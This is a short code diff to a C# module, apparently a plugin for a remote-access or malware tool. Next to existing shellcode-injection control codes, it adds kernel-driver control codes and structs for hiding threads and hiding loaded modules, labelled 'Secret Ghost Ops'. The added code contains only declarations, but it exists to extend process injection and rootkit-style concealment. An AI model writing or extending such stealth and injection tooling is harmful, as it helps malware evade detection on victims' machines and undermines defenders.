@@ -43,6 +43,10 @@ namespace Pulsar.Plugins.Client.Modules
         public static readonly uint INJECTION_SHELLCODE_APC = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_NEITHER, FILE_ANY_ACCESS);
         public static readonly uint INJECTION_SHELLCODE_THREAD_HIJACKING = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_NEITHER, FILE_ANY_ACCESS);
 
+        // Secret Ghost Ops
+        public static readonly uint HIDE_UNHIDE_THREAD = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_NEITHER, FILE_ANY_ACCESS);
+        public static readonly uint HIDE_MODULE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x812, METHOD_NEITHER, FILE_ANY_ACCESS);
+
         [StructLayout(LayoutKind.Sequential)]
         public struct TargetProcess
         {
@@ -52,6 +56,21 @@ namespace Pulsar.Plugins.Client.Modules
             public IntPtr Tp;
             public IntPtr ListEntry;
             public int Options;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TargetThread
+        {
+            public IntPtr Tid;
+            public bool Enable;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct TargetModule
+        {
+            public IntPtr Pid;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+            public string Name;
         }
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
